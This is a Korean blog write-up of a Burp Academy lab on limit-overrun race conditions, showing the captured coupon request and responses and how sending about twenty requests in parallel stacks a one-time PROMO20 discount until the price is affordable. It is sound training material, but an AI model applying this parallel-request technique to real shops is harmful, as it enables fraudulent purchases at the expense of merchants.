---
layout: post
title: "Burp Academy-레이스컨디션 관련 취약점: Limit overrun race conditions"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, 레이스컨디션, Race Condition]
toc: true
last_modified_at: 2023-09-01 10:33:00 +0900
---

# 개요
- 새로 추가된 레이스 컨디션 관련 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
- 취약점 설명페이지: https://portswigger.net/web-security/race-conditions#limit-overrun-race-conditions
- 난이도: APPRENTICE (쉬움)

# Limit Overrun
- Limit Overrun: 어플리케이션에서 설정된 실행 횟수 제한(Limit)를 넘어서 어떤 작업을 수행하게 하는(Overrun) 공격 기법

# 랩 설명
- 이 랩에는 상품을 적정 가격이 아닌 다른 가격으로 구매할 수 있는 레이스 컨디션 취약점 있다. 
- Lightweight L33t Leather Jacket 를 구매하는 랩이 풀린다. 
- wiener:peter 로 로그인할 수 있다. 
- 이 랩을 푸는데는 Burp Suite 버전 2023.9이상이 필요하다. 

```
This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.

You can log in to your account with the following credentials: wiener:peter.

Note
Solving this lab requires Burp Suite 2023.9 or higher.
```

# 도전
## 관찰
- 사야하는 재킷의 가격이 1337달러로 비싸다. 

![상품가격확인](/images/burp-academy-race-condition-1-1.png)

그리고 잔고는 50달러 밖에 없다. 

![잔고확인](/images/burp-academy-race-condition-1-2.png)

- 20%세일된 가격으로 살 수 있는 `PROMO20`라는 쿠폰 코드를 알려주고 있다. 아마 이 코드는 일회용일텐데, 동시에 여러개의 요청을 보내면 추가로 할인이 될 것으로 예상된다. 
- 1337달러의 상품을 할인을 계속해서 50달러 이하로 만들어보자. 


## 레이스 컨디션 가능한 곳 찾기 
- 여러 요청을 그룹으로 묶은 뒤 "Single-packet attack" 을 수행할 수 있다. (Send 셀렉트박스에서 Send Group in parallel (single packet attack) 을 선택한다.)
- 쿠폰 적용하는 요청이 레이스 컨디션이 되는 것을 확인할 수 있었다. 

![](/images/burp-academy-race-condition-1-3.png)

![](/images/burp-academy-race-condition-1-4.png)

```http
POST /cart/coupon HTTP/2
Host: 0aef00fd0340b8968315101100090090.web-security-academy.net
Cookie: session=HFLp5UN41E0NpruM7ySorUcjTDcGwXS1
Content-Length: 52
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aef00fd0340b8968315101100090090.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aef00fd0340b8968315101100090090.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

csrf=CVwhMdoY1iM8W1qsFbR2Mu0ACJg3fp9w&coupon=PROMO20
```

쿠폰이 적용되면 다음과 같은 응답이 돌아온다. 

```http
HTTP/2 302 Found
Location: /cart
X-Frame-Options: SAMEORIGIN
Content-Length: 14

Coupon applied
```



만약 서버측에서 쿠폰이 이미 사용처리된 후라면 다음과 같은 응답이 돌아온다. 

```http
HTTP/2 302 Found
Location: /cart?couponError=COUPON_ALREADY_APPLIED&coupon=PROMO20
X-Frame-Options: SAMEORIGIN
Content-Length: 22

Coupon already applied
```

테스트해보니 쿠폰이 두번이상은 적용이 안된다. 뭔가 다른 방법이 있는건가? 생각해보자.. 

# 풀이 
모르겠다. 답을 본다. 답을 보니 결국 위에서 한 과정이 옳았다. 다만 레이스컨디션이라서 그 때그때 서버의 처리속도에 따라 달라진다. 50달러 이하로 내려가지 않으면 쿠폰을 삭제하고 다시 시도하면 된다. 14번만에 성공했다. 
다음과 같이 약20여개의 요청을 그룹화해서 병렬로 보냈다. 

![병렬로 보내는 모습](/images/burp-academy-race-condition-1-6.png)

중복세일에 성공해서 30달러까지 깍은 모습이다. 

![중복세일에 성공해서 30달러까지 깍은 모습](/images/burp-academy-race-condition-1-5.png)

구매를 시도하면 문제풀이에 성공했다는 메세지가 표시된다.

![풀이 성공](/images/burp-academy-race-condition-1-success.png)